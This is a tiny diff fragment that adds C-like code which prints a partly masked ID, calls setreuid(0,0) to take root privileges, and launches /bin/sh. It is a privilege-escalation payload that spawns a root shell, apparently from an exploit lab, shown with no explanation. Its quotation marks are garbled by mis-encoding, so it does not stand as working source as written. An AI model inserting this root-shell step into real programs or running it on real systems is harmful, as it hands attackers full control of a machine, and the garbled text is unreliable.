@@ -1,0 +1,6 @@
+
+system(¡°echo E415XXXXX¡±);
+setreuid(0,0);
+system(¡°/bin/sh¡±);
+exit(0)
+
